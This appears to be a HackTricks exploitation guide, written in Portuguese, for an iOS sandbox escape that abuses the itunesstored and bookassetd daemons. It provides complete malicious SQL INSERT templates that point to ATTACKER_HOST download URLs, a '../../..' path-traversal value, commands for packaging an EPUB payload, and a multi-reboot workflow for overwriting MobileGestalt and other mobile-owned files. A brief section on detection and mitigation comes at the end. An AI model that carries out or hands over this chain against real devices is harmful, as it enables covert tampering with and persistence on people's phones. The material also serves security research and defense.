# itunesstored & bookassetd Sandbox Escape

{{#include ../../banners/hacktricks-training.md}}

## Visão geral

Pesquisas recentes mostram que dois daemons iOS pré-instalados, **`itunesstored`** (download manager) e **`bookassetd`** (Books / iBooks asset manager), confiam cegamente em metadados SQLite graváveis pelo usuário. Ao deixar arquivos `downloads.28.sqlitedb` e `BLDatabaseManager.sqlite` forjados, além de um arquivo EPUB mínimo, um atacante que consiga gravar em `/var/mobile/Media/` pode forçar esses daemons a realizarem **escritas arbitrárias de arquivos através da maioria dos caminhos pertencentes a `mobile` dentro de `/private/var/`**. Os primitivos sobrevivem a reboots e permitem manipular caches de system group como `systemgroup.com.apple.mobilegestaltcache` para falsificar propriedades do dispositivo ou persistir configurações.

Propriedades principais:

- Funciona em dispositivos até pelo menos **iOS 26.2b1** (testado em iPhone 12 / iOS 26.0.1).
- Alvos graváveis incluem caches `SystemGroup`, `/private/var/mobile/Library/FairPlay`, `/private/var/mobile/Media`, e outros arquivos de propriedade `mobile`. Escritas em arquivos de propriedade `root` falham.
- Requer apenas acesso em nível AFC (cópia de arquivos via USB) ou qualquer foothold que permita substituir os DBs SQLite alvo e enviar payloads.

## Modelo de Ameaça e Requisitos

1. **Acesso local ao sistema de arquivos** a `/var/mobile/Media/Downloads/` e `/var/mobile/Media/Books/` (via clientes AFC como 3uTools, i4.cn, ou [`afcclient`](https://github.com/emonti/afcclient) por USB, ou qualquer comprometimento prévio).
2. **Servidor HTTP** hospedando arquivos do atacante (`BLDatabaseManager.sqlite`, `iTunesMetadata.plist`, EPUB forjado) expostos por URLs como `https://ATTACKER_HOST/fileprovider.php?type=...`.
3. Capacidade de **reiniciar o dispositivo várias vezes** para forçar cada daemon a recarregar seu banco de dados.
4. Conhecimento do **Books system-group UUID** para que a escrita da Stage 1 caia no container correto (encontrado via syslog).

## Stage 1 – Abusando `downloads.28.sqlitedb` via `itunesstored`

`itunesstored` processa `/var/mobile/Media/Downloads/downloads.28.sqlitedb`. A tabela `asset` armazena metadados de URL + destino e é tratada como entrada confiável. Forjar uma linha que aponte para uma URL do atacante e defina `local_path` para `.../Documents/BLDatabaseManager/BLDatabaseManager.sqlite` dentro do Books SystemGroup faz com que o `itunesstored` baixe e sobrescreva o banco de dados do Books com conteúdo do atacante na inicialização.

### Localizar o UUID do Books SystemGroup

1. Colete um arquivo de syslog com [`pymobiledevice3`](https://github.com/doronz88/pymobiledevice3):
```bash
pymobiledevice3 syslog collect logs.logarchive
```
2. Abra `logs.logarchive` no **Console.app** e procure por `bookassetd [Database]: Store is at file:///private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite`.
3. Registre `<UUID>` e substitua-o no payload SQL.

### Linha `asset` maliciosa

<details>
<summary>Template de INSERT da Stage 1</summary>
```sql
INSERT INTO "main"."asset" (
"pid","download_id","asset_order","asset_type","bytes_total",
"url","local_path","destination_url","path_extension","retry_count",
"http_method","initial_odr_size","is_discretionary","is_downloaded",
"is_drm_free","is_external","is_hls","is_local_cache_server",
"is_zip_streamable","processing_types","video_dimensions",
"timeout_interval","store_flavor","download_token","blocked_reason",
"avfoundation_blocked","service_type","protection_type",
"store_download_key","etag","bytes_to_hash","hash_type","server_guid",
"file_protection","variant_id","hash_array","http_headers",
"request_parameters","body_data","body_data_file_path","sinfs_data",
"dpinfo_data","uncompressed_size","url_session_task_id"
) VALUES (
1234567890,6936249076851270150,0,'media',NULL,
'https://ATTACKER_HOST/fileprovider.php?type=sqlite',
'/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite',
NULL,'epub',6,'GET',NULL,0,0,0,1,0,0,0,0,
NULL,60,NULL,466440000,0,0,0,0,'',NULL,NULL,0,
NULL,NULL,NULL,X'62706c6973743030a1015f1020...',NULL,NULL,NULL,NULL,NULL,NULL,0,1
);
```
</details>

**Campos que importam:**

- `url`: endpoint controlado pelo atacante que retorna o `BLDatabaseManager.sqlite` malicioso.
- `local_path`: arquivo `BLDatabaseManager.sqlite` do grupo de sistema Books determinado acima.
- Control flags: mantenha os defaults (`asset_type='media'`, `path_extension='epub'`, booleanos setados para 0/1 como no template) para que o daemon aceite a tarefa.

### Implantação

1. Remova entradas antigas em `/var/mobile/Media/Downloads/*` para evitar condições de corrida.
2. Substitua `downloads.28.sqlitedb` pelo DB forjado via AFC.
3. Reinicie → `itunesstored` baixa o banco de dados Stage 2 e coloca `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist`.
4. Copie esse plist para `/var/mobile/Media/Books/iTunesMetadata.plist`; Stage 2 espera encontrá-lo nessa localização.

## Stage 2 – Abusando de `BLDatabaseManager.sqlite` via `bookassetd`

`bookassetd` possui entitlements de filesystem mais amplos e confia na tabela `ZBLDOWNLOADINFO`. Ao inserir uma linha de compra falsa que referencia URLs controladas pelo atacante e um traversal em `ZPLISTPATH`, o daemon baixa seu EPUB para `/var/mobile/Media/Books/asset.epub` e depois extrai metadados para **qualquer caminho pertencente a `mobile` acessível através de sequências de escape `../../..`**.

### Linha `ZBLDOWNLOADINFO` maliciosa

<details>
<summary>Template de INSERT do Stage 2</summary>
```sql
INSERT INTO "ZBLDOWNLOADINFO" (
"Z_PK","Z_ENT","Z_OPT","ZACCOUNTIDENTIFIER","ZCLEANUPPENDING",
"ZFAMILYACCOUNTIDENTIFIER","ZISAUTOMATICDOWNLOAD","ZISLOCALCACHESERVER",
"ZISPURCHASE","ZISRESTORE","ZISSAMPLE","ZISZIPSTREAMABLE",
"ZNUMBEROFBYTESTOHASH","ZPERSISTENTIDENTIFIER","ZPUBLICATIONVERSION",
"ZSERVERNUMBEROFBYTESTOHASH","ZSIZE","ZSTATE","ZSTOREIDENTIFIER",
"ZSTOREPLAYLISTIDENTIFIER","ZLASTSTATECHANGETIME","ZPURCHASEDATE",
"ZSTARTTIME","ZARTISTNAME","ZARTWORKPATH","ZASSETPATH",
"ZBUYPARAMETERS","ZCANCELDOWNLOADURL","ZCLIENTIDENTIFIER",
"ZCOLLECTIONARTISTNAME","ZCOLLECTIONTITLE","ZDOWNLOADID",
"ZDOWNLOADKEY","ZENCRYPTIONKEY","ZEPUBRIGHTSPATH","ZFILEEXTENSION",
"ZGENRE","ZHASHTYPE","ZKIND","ZMD5HASHSTRINGS","ZORIGINALURL",
"ZPERMLINK","ZPLISTPATH","ZSALT","ZSUBTITLE","ZTHUMBNAILIMAGEURL",
"ZTITLE","ZTRANSACTIONIDENTIFIER","ZURL","ZRACGUID","ZDPINFO",
"ZSINFDATA","ZFILEATTRIBUTES"
) VALUES (
1,2,3,0,0,0,0,'',NULL,NULL,NULL,NULL,
0,0,0,NULL,4648,2,'765107108',NULL,
767991550.119197,NULL,767991353.245275,NULL,NULL,
'/private/var/mobile/Media/Books/asset.epub',
'productType=PUB&salableAdamId=765107106&...',
'https://p19-buy.itunes.apple.com/...',
'4GG2695MJK.com.apple.iBooks','Sebastian Saenz','Cartas de Amor a la Luna',
'../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library',
NULL,NULL,NULL,NULL,'Contemporary Romance',NULL,'ebook',NULL,NULL,NULL,
'/private/var/mobile/Media/Books/iTunesMetadata.plist',NULL,
'Cartas de Amor a la Luna','https://ATTACKER_HOST/fileprovider.php?type=gestalt',
'Cartas de Amor a la Luna','J19N_PUB_190099164604738',
'https://ATTACKER_HOST/fileprovider.php?type=gestalt2',NULL,NULL,NULL,NULL
);
```
</details>

Campos importantes:

- `ZASSETPATH`: localização do EPUB no disco controlada pelo atacante.
- `ZURL`/`ZPERMLINK`: URLs do atacante hospedando o EPUB e o plist auxiliar.
- `ZPLISTPATH`: `../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library` – a **path traversal base** anexada aos arquivos extraídos do EPUB. Ajuste a profundidade de traversal para alcançar o SystemGroup desejado.
- Metadados de compra (`ZSTOREIDENTIFIER`, nomes, timestamps) imitam entradas legítimas para que o daemon não descarte a linha.

Depois de copiar o DB malicioso para /private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite (cortesia da Stage 1) e reiniciar duas vezes, `bookassetd` irá (1) baixar o EPUB, (2) processá-lo e gravar o plist derivado no caminho atravessado.

## Criando o payload do EPUB

`bookassetd` respeita o formato EPUB ZIP: `mimetype` deve ser a primeira entrada descomprimida. Para mapear o conteúdo do EPUB para o cache MobileGestalt, construa uma árvore de diretórios que espelhe o caminho desejado relativo a `ZPLISTPATH`.
```
Caches/
├── mimetype
└── com.apple.MobileGestalt.plist
```
Crie o arquivo:
```bash
zip -X0 hax.epub Caches/mimetype
zip -Xr9D hax.epub Caches/com.apple.MobileGestalt.plist
```
- `mimetype` normalmente contém o literal `application/epub+zip`.
- `Caches/com.apple.MobileGestalt.plist` contém a payload controlada pelo atacante que irá aterrissar em `.../Library/Caches/com.apple.MobileGestalt.plist`.

## Orchestration Workflow

1. **Prepare files** no servidor HTTP do atacante e crie ambos os SQLite DBs com valores específicos de host/UUID.
2. **Replace `downloads.28.sqlitedb`** no dispositivo e reboot → Stage 1 faz o download do malicioso `BLDatabaseManager.sqlite` e emite `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist`.
3. **Copy `iTunesMetadata.plist`** para `/var/mobile/Media/Books/iTunesMetadata.plist` (repita se o daemon o deletar).
4. **Reboot again** → `bookassetd` faz o download de `asset.epub` para `/var/mobile/Media/Books/` usando os metadados da Stage 2.
5. **Reboot a third time** → `bookassetd` processa o asset baixado, segue `ZPLISTPATH` e grava o conteúdo do EPUB no caminho SystemGroup alvo (por ex., `com.apple.MobileGestalt.plist`).
6. **Verify** lendo o plist sobrescrito ou observando que propriedades derivadas de MobileGestalt (model identifier, activation flags, etc.) mudem conforme esperado.

O mesmo padrão permite colocar arquivos em outros caches pertencentes a `mobile`, como estados do FairPlay ou diretórios de persistência, possibilitando adulteração furtiva sem necessidade de um exploit de kernel.

## Tooling & Operational Notes

- **`pymobiledevice3 syslog collect logs.logarchive`** – extrair logs para descobrir o Books SystemGroup UUID.
- **Console.app** – filtrar por `bookassetd [Database]: Store is at ...` para recuperar o caminho exato do container.
- **AFC clients (`afcclient`, 3uTools, i4.cn)** – push/pull de SQLite DBs e arquivos plist via USB sem jailbreak.
- **`zip`** – impor restrições de ordenação do EPUB ao empacotar payloads.
- **Public PoC** – <https://github.com/hanakim3945/bl_sbx> fornece templates base de SQLite/EPUB que você pode customizar.

## Detection & Mitigation Ideas

- Tratar `downloads.28.sqlitedb` e `BLDatabaseManager.sqlite` como input não confiável: validar que `local_path` / `ZPLISTPATH` permaneçam dentro dos sandboxes aprovados e rejeitar caminhos totalmente qualificados ou traversal tokens.
- Monitorar escritas via AFC que substituam esses bancos de dados ou downloads inesperados iniciados por `itunesstored` / `bookassetd` logo após o boot.
- Endurecer o unpacking do `bookassetd` para chamar `realpath()` no destino de saída e garantir que não possa escapar do container Books antes de gravar arquivos.
- Restringir canais de cópia de arquivos via AFC / USB ou exigir interação do usuário antes de permitir a substituição de arquivos de metadata do Books/iTunes.

## References

- [itunesstored & bookassetd sbx escape](https://hanakim3945.github.io/posts/download28_sbx_escape/)
- [bl_sbx PoC repository](https://github.com/hanakim3945/bl_sbx)

{{#include ../../banners/hacktricks-training.md}}
